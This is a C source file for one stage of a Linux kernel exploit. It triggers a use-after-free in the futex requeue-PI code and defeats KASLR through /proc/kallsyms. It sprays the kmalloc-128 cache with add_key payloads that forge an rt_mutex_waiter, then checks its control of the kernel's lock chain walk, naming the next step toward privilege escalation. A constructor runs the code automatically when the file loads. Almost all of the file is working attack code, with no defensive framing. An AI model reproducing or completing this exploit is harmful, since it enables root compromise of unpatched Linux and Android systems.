// EDEADLK test - confirms chain walk without needing kernel read
// If fake_lock->owner = current_task, kernel detects deadlock → EDEADLK

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <linux/futex.h>
#include <stdatomic.h>
#include <errno.h>

#define KEY_SPEC_PROCESS_KEYRING -2
#define KEYCTL_UNLINK 9

#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef __NR_add_key
#define __NR_add_key 217
#endif
#ifndef __NR_keyctl
#define __NR_keyctl 219
#endif

static uint32_t f_waiter_owns = 0;
static uint32_t f_wait = 0;
static uint32_t f_pi_target = 0;

static atomic_int owner_ready = 0;
static atomic_int waiter_ready = 0;

static uint64_t kaslr_slide = 0;

static inline uint64_t canon(uint64_t addr) {
    return addr | 0xffff000000000000ULL;
}

// Get ENTRY_TASK[cpu] - the current task for this CPU
// This is a per-CPU pointer, we can compute it from static offsets
static uint64_t get_entry_task_addr(int cpu) {
    // ENTRY_TASK is the per-CPU array of current task pointers
    // ENTRY_TASK + cpu*8 = address of current_task pointer for that CPU
    uint64_t entry_task_base = canon(0xffffff8009878070ULL + kaslr_slide);
    return entry_task_base + cpu * 8;
}

void *owner_thread_fn(void *arg) {
    (void)arg;
    syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&owner_ready, 1);
    while (1) sleep(60);
    return NULL;
}

void *waiter_thread_fn(void *arg) {
    (void)arg;
    syscall(SYS_futex, &f_waiter_owns, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&waiter_ready, 1);
    usleep(10000);
    
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 60;
    
    int ret = syscall(SYS_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    printf("[WAITER] returned %d errno=%d\n", ret, errno);
    return NULL;
}

void run_test(void) {
    printf("=== EDEADLK Chain Walk Test ===\n\n");
    
    // Get KASLR slide
    FILE *ks = fopen("/proc/kallsyms", "r");
    uint64_t perf_event_addr = 0;
    if (ks) {
        char line[256];
        while (fgets(line, sizeof(line), ks)) {
            if (strstr(line, " T perf_event_init_task")) {
                perf_event_addr = strtoull(line, NULL, 16);
                break;
            }
        }
        fclose(ks);
    }
    
    kaslr_slide = perf_event_addr ? (perf_event_addr - 0xffffff80081f2f74ULL) : 0;
    printf("[*] KASLR slide: %lx\n", kaslr_slide);
    
    // Get current CPU
    int cpu = sched_getcpu();
    printf("[*] Current CPU: %d\n", cpu);
    
    // Compute entry_task pointer address for current CPU
    // *(entry_task_addr) = current task_struct address
    uint64_t entry_task_addr = get_entry_task_addr(cpu);
    printf("[*] ENTRY_TASK[%d] address: %lx\n", cpu, entry_task_addr);
    
    // fake_lock = entry_task_addr - 0x18
    // So fake_lock->owner = *(entry_task_addr) = current_task
    uint64_t fake_lock = entry_task_addr - 0x18;
    printf("[*] fake_lock: %lx\n", fake_lock);
    printf("[*] fake_lock->owner at +0x18 = *(%lx) = current_task\n", entry_task_addr);
    
    // For waiter->task, we don't know current_task, but we can try init_task
    uint64_t init_task = canon(0xffffff800957b6c0ULL + kaslr_slide);
    printf("[*] init_task: %lx (using as waiter->task)\n", init_task);
    
    // Build payload
    char payload[110];
    memset(payload, 0, sizeof(payload));
    memcpy(payload + 30, &init_task, 8);   // waiter->task
    memcpy(payload + 38, &fake_lock, 8);   // waiter->lock
    *(int *)(payload + 46) = 1;            // waiter->prio
    
    // Drain
    printf("\n[1] Draining kmalloc-128...\n");
    int drain[6500];
    for (int i = 0; i < 6500; i++) {
        drain[i] = syscall(__NR_add_key, "user", "d", payload, 110, KEY_SPEC_PROCESS_KEYRING);
    }
    printf("[+] Done\n");
    
    // Start threads
    printf("\n[2] Starting threads...\n");
    pthread_t owner_thr, waiter_thr;
    pthread_create(&owner_thr, NULL, owner_thread_fn, NULL);
    while (!atomic_load(&owner_ready)) sched_yield();
    usleep(50000);
    
    pthread_create(&waiter_thr, NULL, waiter_thread_fn, NULL);
    while (!atomic_load(&waiter_ready)) sched_yield();
    usleep(300000);
    
    printf("[+] f_waiter_owns=%u f_pi_target=%u\n", f_waiter_owns, f_pi_target);
    
    // UAF
    printf("\n[3] Triggering UAF...\n");
    int ret = syscall(SYS_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &f_pi_target, 0);
    printf("[+] ret=%d errno=%d\n", ret, errno);
    
    if (ret != 1) {
        printf("[-] UAF failed\n");
        goto cleanup;
    }
    
    // After requeue, waiter should be blocking on f_pi_target
    // Waiter's rt_mutex_waiter should be in owner's pi_waiters tree
    // But we freed it! Now reclaim with our fake data
    printf("\n[4] Reclaiming freed waiter slot...\n");
    int winner = syscall(__NR_add_key, "user", "w", payload, 110, KEY_SPEC_PROCESS_KEYRING);
    printf("[+] Reclaim key=%d\n", winner);
    
    // Small delay to let the kernel settle
    usleep(50000);
    
    // Chain walk - THIS IS THE TEST
    printf("\n[5] Chain walk test...\n");
    printf("[*] Calling FUTEX_LOCK_PI(f_waiter_owns)\n");
    printf("[*] If chain reaches fake_waiter, and fake_lock->owner = current,\n");
    printf("[*] kernel should return EDEADLK (deadlock detected)\n\n");
    
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 10;
    
    long walk_ret = syscall(SYS_futex, &f_waiter_owns, FUTEX_LOCK_PI, 0, &ts, NULL, 0);
    
    printf("[RESULT] ret=%ld errno=%d\n", walk_ret, errno);
    
    if (errno == EDEADLK) {
        printf("\n[!!!] SUCCESS! EDEADLK = chain walk confirmed!\n");
        printf("[!!!] The exploit mechanism is working.\n");
        printf("[!!!] Next step: find correct group_leader offset.\n");
    } else if (errno == ETIMEDOUT) {
        printf("\n[-] ETIMEDOUT - chain did NOT reach fake waiter\n");
        printf("[-] The UAF payload may not be in the right place\n");
    } else {
        printf("\n[?] Unexpected errno=%d\n", errno);
    }

cleanup:
    for (int i = 0; i < 6500; i++) {
        if (drain[i] > 0) syscall(__NR_keyctl, KEYCTL_UNLINK, drain[i], KEY_SPEC_PROCESS_KEYRING);
    }
}

__attribute__((constructor))
void init(void) {
    run_test();
}
